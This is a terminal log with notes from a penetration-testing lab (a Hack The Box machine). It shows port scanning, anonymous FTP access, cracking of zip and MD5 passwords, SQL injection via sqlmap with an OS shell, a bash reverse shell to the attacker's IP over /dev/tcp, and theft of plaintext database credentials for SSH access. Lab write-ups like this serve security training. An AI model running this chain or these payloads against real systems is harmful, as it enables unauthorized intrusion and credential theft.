```
blob:https://app.hackthebox.com/992bb2da-a712-4692-91e4-86edbc11e2d7

┌──(kali㉿kali)-[~/hackthebox]
└─$ ping 10.129.247.247                                                  
PING 10.129.247.247 (10.129.247.247) 56(84) bytes of data.
64 bytes from 10.129.247.247: icmp_seq=1 ttl=63 time=198 ms
64 bytes from 10.129.247.247: icmp_seq=2 ttl=63 time=188 ms
^C
--- 10.129.247.247 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1004ms
rtt min/avg/max/mdev = 187.955/193.002/198.050/5.047 ms
                                                                                 
┌──(kali㉿kali)-[~/hackthebox]
└─$ rustscan -a 10.129.247.247 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.129.247.247:21
Open 10.129.247.247:22
Open 10.129.247.247:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-08 07:07 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:07
Completed NSE at 07:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:07
Completed NSE at 07:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:07
Completed NSE at 07:07, 0.00s elapsed
Initiating Ping Scan at 07:07
Scanning 10.129.247.247 [2 ports]
Completed Ping Scan at 07:07, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:07
Completed Parallel DNS resolution of 1 host. at 07:07, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 07:07
Scanning 10.129.247.247 [3 ports]
Discovered open port 22/tcp on 10.129.247.247
Discovered open port 80/tcp on 10.129.247.247
Discovered open port 21/tcp on 10.129.247.247
Completed Connect Scan at 07:07, 0.19s elapsed (3 total ports)
Initiating Service scan at 07:07
Scanning 3 services on 10.129.247.247
Completed Service scan at 07:07, 6.43s elapsed (3 services on 1 host)
NSE: Script scanning 10.129.247.247.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:07
NSE: [ftp-bounce 10.129.247.247:21] PORT response: 500 Illegal PORT command.
Completed NSE at 07:07, 5.86s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:07
Completed NSE at 07:07, 1.41s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:07
Completed NSE at 07:07, 0.00s elapsed
Nmap scan report for 10.129.247.247
Host is up, received syn-ack (0.19s latency).
Scanned at 2022-11-08 07:07:14 EST for 14s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.113
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh     syn-ack OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0ee58077534b00b9165b259569527a4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzC28uKxt9pqJ4fLYmq/X5t7p44L+bUFQIDeEab29kDPnKdFOa9ijB5C5APVxLaAXVYSXATPYUqjIEWU98Vvvol1zuc82+KG9KfX94pD8TaPY2MZnoi9TfSxgwmKpmiRWR4DwwMS+mNo+WBU3sjB2QjgNip2vbiHxMitKeIfDLLFYiLKhc1eBRtooZ6DJzXQOMFp5QhSbZygWqebpFcsrmFnz9QWhx4MekbUnUVPKwCunycLi1pjrsmOAekbGz3/5R3H5tFSck915iqyc8bSkBZgRwW3FDJAXFmFgHG9fX727HsXFk8MXmVRMuH1LxGjvn1q3j27bb22QzprS7t9bJciWfwgt1sl57S0Q+iFbku83NgAFxUG373nspOHn08DwMllCyeLOG3Oy3x9zcCxMGATopiPckt8lb1GCWIvLPSNHMW12OyCKGM+AmLu4q9z7zX1YOUM6oxfn3qZVLKSZJ/DJu+aifv2BVNu/zJU2wdk1vFxysmQ4roj5O5I+H9x0=
|   256 ac6e81188922d7a7417d814f1bb8b251 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNsSORVFGkIbgItDm/mxmyPhpsIJihXV8y4CQiMTWGdEVQatXNIlXX0yGLZ4JFtPEX9rOGAp/eLZc0mGJtDyuyQ=
|   256 425bc321dfefa20bc95e03421d69d028 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXvk132UscLPAfaZyZ2Av54rpw9cP31OrloBE9v3SLW
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:07
Completed NSE at 07:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:07
Completed NSE at 07:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:07
Completed NSE at 07:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.22 seconds

|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)

                                                                                 
┌──(kali㉿kali)-[~/hackthebox]
└─$ ftp 10.129.247.247
Connected to 10.129.247.247.
220 (vsFTPd 3.0.3)
Name (10.129.247.247:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10347|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10480|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |************************************|  2533       12.07 MiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (13.42 KiB/s)
ftp> quit
221 Goodbye.

┌──(kali㉿kali)-[~/hackthebox]
└─$ zip2john backup.zip > hash_zip                                     
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                 
┌──(kali㉿kali)-[~/hackthebox]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_zip          
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2022-11-08 07:56) 33.33g/s 273066p/s 273066c/s 273066C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(kali㉿kali)-[~/hackthebox]
└─$ unzip backup.zip                                                            
Archive:  backup.zip
[backup.zip] index.php password: 741852963
  inflating: index.php               
  inflating: style.css               
                                                                                 
┌──(kali㉿kali)-[~/hackthebox]
└─$ cat index.php   
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>

┌──(kali㉿kali)-[~/hackthebox]
└─$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 2cb42f8734ea607eefed3b70af13bbd3

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($salt.$pass))
[+] md5($salt.md5(md5($pass).$salt))
[+] md5($username.0.$pass)
[+] md5($username.LF.$pass)
[+] md5($username.md5($pass).$salt)
[+] md5(md5($pass))
[+] md5(md5($pass).$salt)
[+] md5(md5($pass).md5($salt))
[+] md5(md5($salt).$pass)
[+] md5(md5($salt).md5($pass))
[+] md5(md5($username.$pass).$salt)
[+] md5(md5(md5($pass)))
[+] md5(md5(md5(md5($pass))))
[+] md5(md5(md5(md5(md5($pass)))))
[+] md5(sha1($pass))
[+] md5(sha1(md5($pass)))
[+] md5(sha1(md5(sha1($pass))))
[+] md5(strtoupper(md5($pass)))
--------------------------------------------------
 HASH: ^C

        Bye!

┌──(kali㉿kali)-[~/hackthebox]
└─$ hashcat -h | grep "MD5"
      0 | MD5                                                        | Raw Hash
   5100 | Half MD5                                                   | Raw Hash
     50 | HMAC-MD5 (key = $pass)                                     | Raw Hash authenticated
     60 | HMAC-MD5 (key = $salt)                                     | Raw Hash authenticated
  11900 | PBKDF2-HMAC-MD5                                            | Generic KDF
  11400 | SIP digest authentication (MD5)                            | Network Protocol
   5300 | IKE-PSK MD5                                                | Network Protocol
  25100 | SNMPv3 HMAC-MD5-96                                         | Network Protocol
  25000 | SNMPv3 HMAC-MD5-96/HMAC-SHA1-96                            | Network Protocol
  10200 | CRAM-MD5                                                   | Network Protocol
   4800 | iSCSI CHAP authentication, MD5(CHAP)                       | Network Protocol
  19000 | QNX /etc/shadow (MD5)                                      | Operating System
   2410 | Cisco-ASA MD5                                              | Operating System
   2400 | Cisco-PIX MD5                                              | Operating System
    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)                  | Operating System
  11100 | PostgreSQL CRAM (MD5)                                      | Database Server
  16400 | CRAM-MD5 Dovecot                                           | FTP, HTTP, SMTP, LDAP Server
  24900 | Dahua Authentication MD5                                   | FTP, HTTP, SMTP, LDAP Server
   1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)                      | FTP, HTTP, SMTP, LDAP Server
   9700 | MS Office <= 2003 $0/$1, MD5 + RC4                         | Document
   9710 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #1            | Document
   9720 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #2            | Document
  30000 | Python Werkzeug MD5 (HMAC-MD5 (key = $salt))               | Framework
  22500 | MultiBit Classic .key (MD5)                                | Cryptocurrency Wallet
  Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
  Brute-Force      | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a
  Combinator       | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict

┌──(kali㉿kali)-[~/hackthebox]
└─$ hashcat -a 0 -m 0 hash_vaccine /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1243/2550 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

2cb42f8734ea607eefed3b70af13bbd3:qwerty789                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 2cb42f8734ea607eefed3b70af13bbd3
Time.Started.....: Tue Nov  8 08:05:09 2022 (1 sec)
Time.Estimated...: Tue Nov  8 08:05:10 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   132.3 kH/s (0.37ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 100352/14344385 (0.70%)
Rejected.........: 0/100352 (0.00%)
Restore.Point....: 99328/14344385 (0.69%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 020180 -> paashaas
Hardware.Mon.#1..: Util: 83%

Started: Tue Nov  8 08:04:03 2022
Stopped: Tue Nov  8 08:05:12 2022

so admin:qwerty789 (port 80 web login)

So the dashboard has nothing special in it, however, it has a catalogue, which might be connected with the
database. Let's create any query:
By checking the URL, we can see that there is a variable $search which is responsible for searching through
catalogue. We could test it to see if it's SQL injectable, but instead of doing it manually, we will use a tool
called sqlmap .

SQLmap is an open-source tool used in penetration testing to detect and exploit SQL
injection flaws. SQLmap automates the process of detecting and exploiting SQL
injection. SQL Injection attacks can take control of databases that utilize SQL.

We will provide the URL & the cookie to the sqlmap in order for it to find vulnerability. The reason why we
have to provide a cookie is because of authentication:
To grab the cookie, we can intercept any request in Burp Suite & get it from there, however, you can install a
great extension for your web browser called cookie-editor :

For Google:
https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm
For Firefox:
https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/

The cookies in HTTP messages of requests are usually set the following way:
PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1
Knowing that, here's how our sqlmap syntax should look:

sqlmap -u 'http://10.129.247.247/dashboard.php?search=any+query' --
cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"

┌──(kali㉿kali)-[~/hackthebox]
└─$ sqlmap -u 'http://10.129.247.247/dashboard.php?search=any+query' --cookie="PHPSESSID=0ijeng7kcrkgdgoc6jquimgmi5"
        ___
       __H__                                                                     
 ___ ___[(]_____ ___ ___  {1.6.10#stable}                                        
|_ -| . [,]     | .'| . |                                                        
|___|_  [,]_|_|_|__,|  _|                                                        
      |_|V...       |_|   https://sqlmap.org                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:21:34 /2022-11-08/

[08:21:34] [INFO] testing connection to the target URL
[08:21:35] [INFO] testing if the target URL content is stable
[08:21:35] [INFO] target URL content is stable
[08:21:35] [INFO] testing if GET parameter 'search' is dynamic
[08:21:35] [WARNING] GET parameter 'search' does not appear to be dynamic
[08:21:35] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
[08:21:36] [INFO] testing for SQL injection on GET parameter 'search'
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 
[08:21:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:21:47] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                              
[08:21:48] [INFO] testing 'Generic inline queries'
[08:21:48] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'                                                                    
[08:21:50] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable                            
[08:21:50] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[08:21:50] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable                                                      
[08:21:50] [INFO] testing 'PostgreSQL inline queries'
[08:21:50] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[08:21:50] [WARNING] time-based comparison requires larger statistical model, please wait..... (done)
[08:22:02] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable                                                    
[08:22:02] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[08:22:12] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable                                                         
[08:22:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

Out of this output, the thing that is important to us is the following:
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)?
[y/N]
The tool confirmed that the target is vulnerable to SQL injection, which is everything we needed to know. We
will run the sqlmap once more, where we are going to provide the --os-shell flag, where we will be able
to perform command injection:

┌──(kali㉿kali)-[~/hackthebox]
└─$ sqlmap -u 'http://10.129.247.247/dashboard.php?search=any+query' --cookie="PHPSESSID=0ijeng7kcrkgdgoc6jquimgmi5" --os-shell
        ___
       __H__                                                                     
 ___ ___[']_____ ___ ___  {1.6.10#stable}                                        
|_ -| . ["]     | .'| . |                                                        
|___|_  ["]_|_|_|__,|  _|                                                        
      |_|V...       |_|   https://sqlmap.org                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:24:06 /2022-11-08/

[08:24:06] [INFO] testing connection to the target URL
[08:24:07] [INFO] testing if the target URL content is stable
[08:24:08] [INFO] target URL content is stable
[08:24:08] [INFO] testing if GET parameter 'search' is dynamic
[08:24:08] [WARNING] GET parameter 'search' does not appear to be dynamic
[08:24:08] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
[08:24:08] [INFO] testing for SQL injection on GET parameter 'search'
[08:24:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:24:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                              
[08:24:11] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                              
[08:24:13] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[08:24:15] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                             
[08:24:16] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                                                             
[08:24:17] [INFO] testing 'Generic inline queries'
[08:24:17] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[08:24:28] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable                                                    
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 
[08:25:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[08:25:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[08:25:11] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[08:25:11] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
[08:25:12] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[08:25:12] [WARNING] reflective value(s) found and filtering out
[08:25:13] [INFO] target URL appears to have 5 columns in query
[08:25:14] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                                                             
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: search (GET)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=any query';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=any query' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(118)||CHR(113)||CHR(107)||CHR(113))||(CHR(118)||CHR(69)||CHR(99)||CHR(86)||CHR(82)||CHR(69)||CHR(83)||CHR(100)||CHR(77)||CHR(102)||CHR(83)||CHR(65)||CHR(88)||CHR(73)||CHR(116)||CHR(107)||CHR(79)||CHR(99)||CHR(115)||CHR(70)||CHR(77)||CHR(108)||CHR(83)||CHR(79)||CHR(88)||CHR(77)||CHR(108)||CHR(114)||CHR(83)||CHR(117)||CHR(72)||CHR(82)||CHR(84)||CHR(83)||CHR(84)||CHR(119)||CHR(117)||CHR(111)||CHR(104)||CHR(99))||(CHR(113)||CHR(113)||CHR(106)||CHR(120)||CHR(113)),NULL,NULL-- Irra
---
[08:25:16] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[08:25:18] [INFO] fingerprinting the back-end DBMS operating system
[08:25:19] [INFO] the back-end DBMS operating system is Linux
[08:25:19] [INFO] testing if current user is DBA
[08:25:21] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[08:25:21] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] 
command standard output: 'postgres'

rev-shell with sqlmap

We got the shell, however, it is not very stable & interactive. To make it much stable, we will use the
following payload:
bash -c "bash -i >& /dev/tcp/10.10.14.113/443 0>&1"
We will turn on the netcat listener on port 443:

os-shell> bash -c "bash -i >& /dev/tcp/10.10.14.113/443 0>&1"
do you want to retrieve the command standard output? [Y/n/a] 
[08:27:08] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)

┌──(kali㉿kali)-[~/hackthebox]
└─$ sudo nc -lvnp 443                        
[sudo] password for kali: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.247.247.
Ncat: Connection from 10.129.247.247:57130.
bash: cannot set terminal process group (3432): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$ whoami
whoami
postgres
postgres@vaccine:/var/lib/postgresql/11/main$ which python
which python
postgres@vaccine:/var/lib/postgresql/11/main$ which python3
which python3
/usr/bin/python3

We will go back to our listener to see if we got the connection:
We got the foothold. We will quickly make our shell fully interactive:

postgres@vaccine:/var/lib/postgresql/11/main$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ain$ python3 -c 'import pty;pty.spawn("/bin/bash")'
postgres@vaccine:/var/lib/postgresql/11/main$ ^Z
zsh: suspended  sudo nc -lvnp 443
                                                                                 
┌──(kali㉿kali)-[~/hackthebox]
└─$ stty raw -echo                 
                                                                                 
┌──(kali㉿kali)-[~/hackthebox]
                              └─$ fg
[1]  + continued  sudo nc -lvnp 443
                                   export TERM=xterm

export TERM=xterm
postgres@vaccine:/var/lib/postgresql/11/main$ 

postgres@vaccine:/var/lib/postgresql/11/main$ find / -type f -name user.txt 2>/dev/null
find / -type f -name user.txt 2>/dev/null
/var/lib/postgresql/user.txt
postgres@vaccine:/var/lib/postgresql/11/main$ cat /var/lib/postgresql/user.txt
cat /var/lib/postgresql/user.txt
ec9b13ca4d6229cd5cc1e09980965bf7

priv esc

We are user postgres , but we don't know the password for it, which means we cannot check our sudo
privileges:
We will try to find the password in the /var/www/html folder, since the machine uses both PHP & SQL,
meaning that there should be credentials in clear text

postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l
sudo -l
[sudo] password for postgres: 

Sorry, try again.
[sudo] password for postgres: 

Sorry, try again.
[sudo] password for postgres: 

sudo: 3 incorrect password attempts
postgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html
cd /var/www/html
postgres@vaccine:/var/www/html$ ls
ls
bg.png         dashboard.js   index.php    style.css
dashboard.css  dashboard.php  license.txt

postgres@vaccine:/var/www/html$ cat dashboard.php
cat dashboard.php
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Admin Dashboard</title>
  <link rel="stylesheet" href="./dashboard.css">
  <script src="https://use.fontawesome.com/33a3739634.js"></script>

</head>
<body>
<!-- partial:index.partial.html -->
<body>
 <div id="wrapper">
 <div class="parent">
  <h1 align="left">MegaCorp Car Catalogue</h1>
<form action="" method="GET">
<div class="search-box">
  <input type="search" name="search" placeholder="Search" />
  <button type="submit" class="search-btn"><i class="fa fa-search"></i></button>
</div>
</form>
  </div>
  
  <table id="keywords" cellspacing="0" cellpadding="0">
    <thead>
      <tr>
        <th><span style="color: white">Name</span></th>
        <th><span style="color: white">Type</span></th>
        <th><span style="color: white">Fuel</span></th>
        <th><span style="color: white">Engine</span></th>
      </tr>
    </thead>
    <tbody>
        <?php
        session_start();
        if($_SESSION['login'] !== "true") {
          header("Location: index.php");
          die();
        }
        try {
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");

ssh port 5432: postgres:P@s5w0rd!

┌──(kali㉿kali)-[~/hackthebox]
└─$ ssh postgres@10.129.247.247   
The authenticity of host '10.129.247.247 (10.129.247.247)' can't be established.
ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.247.247' (ED25519) to the list of known hosts.
postgres@10.129.247.247's password: 
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 08 Nov 2022 01:39:34 PM UTC

  System load:  0.0               Processes:             191
  Usage of /:   32.6% of 8.73GB   Users logged in:       0
  Memory usage: 22%               IP address for ens160: 10.129.247.247
  Swap usage:   0%


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

postgres@vaccine:~$ whoami
postgres
postgres@vaccine:~$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
